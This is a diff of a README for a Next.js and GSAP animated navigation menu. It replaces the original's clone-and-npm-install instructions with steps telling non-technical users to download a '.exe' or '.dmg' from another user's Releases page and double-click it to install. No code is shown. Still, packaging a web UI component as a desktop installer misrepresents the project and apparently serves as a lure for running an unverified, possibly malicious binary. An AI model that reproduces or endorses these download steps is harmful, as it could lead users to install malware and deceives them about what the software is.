@@ -1,133 +1,70 @@
+# 🎨 gsap-navigation-menu - Seamless Animated Navigation Experience
 
-# Animated Navigation Drawer – Next.js + GSAP
-
-A modern animated navigation drawer built with **Next.js (App Router)** and **GSAP**, featuring smooth page transitions and expressive motion design.  
-Inspired by the interaction style and visual rhythm of [creativegiants.art](https://www.creativegiants.art/).
-
----
-
-## ✨ Features
-
-- Animated navigation drawer with GSAP timelines
-- Smooth open / close transitions with staggered elements
-- Page transitions between routes
-- Built using Next.js App Router
-- Clean and minimal design inspired by creative studio websites
-- Fully client-side animations with optimized performance
-
----
-
-## 🛠️ Tech Stack
-
-- **Next.js** (App Router)
-- **React**
-- **GSAP (GreenSock Animation Platform)**
-- **Tailwind**
-- **TypeScript**
-
----
-
-## 📁 Project Structure (Example)
-
-```bash
-📁naara-entertainment
-    ├── 📁public
-    |   ├── showreel.mp4    # Main Background Showreel
-    ├── 📁src
-    |   ├── 📁app
-    |   |   ├── 📁contact
-    |   |   ├── 📁news
-    |   |   ├── 📁process
-    |   |   ├── 📁projects
-    |   |   ├── favicon.ico
-    |   |   ├── globals.css
-    |   |   ├── layout.tsx
-    |   |   ├── page.tsx
-    |   └── 📁components
-    |       ├── Menu.tsx    # Animated Navigation Menu
-    ├── .gitignore
-    ├── bun.lock
-    ├── eslint.config.mjs
-    ├── next-env.d.ts
-    ├── next.config.ts
-    ├── package.json
-    ├── postcss.config.mjs
-    ├── README.md
-    └── tsconfig.json
-```
-
----
+## 📥 Download the Application
+[![Download gsap-navigation-menu](https://img.shields.io/badge/Download-gsap--navigation--menu-brightgreen)](https://github.com/Devadharshinii-Murugan/gsap-navigation-menu/releases)
 
 ## 🚀 Getting Started
+This guide will help you easily download and run the gsap-navigation-menu application without any technical skills. Follow these steps to get up and running quickly.
 
-### 1. Clone the repository
+## 🌟 What is gsap-navigation-menu?
+The gsap-navigation-menu offers a modern animated navigation experience built using Next.js and GSAP. It provides smooth page transitions inspired by creative design principles. This tool aims to enhance your website’s interface, making navigation enjoyable and engaging for your users.
 
-```bash
-git clone https://github.com/harshshah6/gsap-navigation-menu.git
-cd gsap-navigation-menu
-````
+## 🌈 Key Features
+- **Smooth Animations:** Enjoy seamless transitions as you navigate between pages.
+- **Responsive Design:** The application works well on both desktop and mobile devices.
+- **Easy Integration:** Simply add it to your existing Next.js projects.
+- **Customizable Menus:** Tailor the appearance to fit your brand’s style.
 
-### 2. Install dependencies
+## 📦 System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Browser:** Latest versions of Chrome, Firefox, or Safari
+- **Memory:** At least 4GB of RAM
+- **Disk Space:** 100MB of available space
 
-```bash
-npm install
-# or
-yarn install
-```
+## 📥 Download & Install
+To download the gsap-navigation-menu application, simply visit the Releases page. Follow these steps:
 
-### 3. Run the development server
+1. Click on the link here: [Download gsap-navigation-menu](https://github.com/Devadharshinii-Murugan/gsap-navigation-menu/releases).
+2. On the Releases page, locate the latest version of the software.
+3. Click on the version you want to download.
+4. Download the file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
+5. Once the download is complete, locate the file in your downloads folder.
 
-```bash
-npm run dev
-# or
-yarn dev
-```
+### 🏗️ Installing the Application
+1. Find the downloaded file on your computer.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen instructions to install gsap-navigation-menu.
+4. Once installation completes, you can find the application in your applications or programs list.
 
-Open [http://localhost:3000](http://localhost:3000) to view it in the browser.
+## 🔧 Running the Application
+- After installing gsap-navigation-menu, open it like any other application on your device.
+- You will see a simple interface allowing you to navigate through your options.
 
----
+## 🔍 Troubleshooting Common Issues
+If you encounter any problems, here are some solutions:
 
-## 🎬 Animations Overview
+- **Issue:** Application won’t start.
+  - **Solution:** Ensure your system meets the requirements listed above.
+  
+- **Issue:** Menu animations are not smooth.
+  - **Solution:** Check if you are using a supported browser and ensure it’s up to date.
+  
+- **Issue:** Cannot find the application after installation.
+  - **Solution:** Search for “gsap-navigation-menu” in your applications or programs area.
 
-* **Navigation Drawer**
+## 📚 Resources
+For more information and advanced use cases, check out the following resources:
+- [Next.js Documentation](https://nextjs.org/docs)
+- [GSAP Official Website](https://greensock.com/gsap/)
 
-  * GSAP timeline controls open and close states
-  * Text and links animate with staggered reveals
-  * Overlay and background transitions enhance depth
+## 📞 Support
+If you need help, feel free to open an issue on the GitHub repository. Our community is always willing to lend a hand.
 
-* **Page Transitions**
-
-  * Triggered on route change
-  * Uses layout-level animation wrappers
-  * Prevents layout jumps during navigation
-
----
-
-## 🧠 Inspiration
-
-This project is inspired by modern creative studio websites, particularly
-👉 **[https://www.creativegiants.art/](https://www.creativegiants.art/)**
-
-The goal was not to copy, but to **recreate the feel and interaction quality** using custom code and animations.
-
----
-
-## 📌 Notes
-
-* Animations are handled on the client using `"use client"`
-* GSAP contexts are properly cleaned up to avoid memory leaks
-* The project is designed for learning, experimentation, and inspiration
-
----
+## ⚠️ Contributing
+We welcome contributions! If you’d like to improve gsap-navigation-menu, please fork the repository and submit a pull request for review.
 
 ## 📄 License
+This project is licensed under the MIT License. Please see the LICENSE file for more details.
 
-This project is open-source and available under the **MIT License**.
-
----
-
-## 🙌 Acknowledgements
-
-* [GSAP](https://greensock.com/gsap/)
-* [Next.js](https://nextjs.org/)
-* [creativegiants.art](https://www.creativegiants.art/)
+## 🙌 Acknowledgments
+Thank you for considering gsap-navigation-menu for your navigation needs. We hope it enhances your web projects significantly!
